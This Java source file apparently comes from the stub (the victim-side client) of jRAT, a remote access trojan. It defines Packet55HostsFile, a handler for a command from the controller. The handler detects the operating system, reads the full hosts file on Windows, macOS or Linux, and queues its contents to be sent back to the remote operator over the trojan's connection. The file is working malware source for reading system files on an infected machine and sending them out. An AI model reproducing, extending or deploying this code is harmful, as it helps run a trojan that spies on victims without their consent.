package io.jrat.stub.packets.incoming;

import io.jrat.common.OperatingSystem;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet38HostFile;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;


public class Packet55HostsFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = null;

		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			file = new File("/private/etc/hosts");
		} else {
			file = new File("/etc/hosts");
		}

		if (file != null) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
			String tosend = "";

			String line;

			while ((line = reader.readLine()) != null) {
				tosend += line + "\n";
			}
			reader.close();

			Connection.addToSendQueue(new Packet38HostFile(tosend));
		}
	}

}
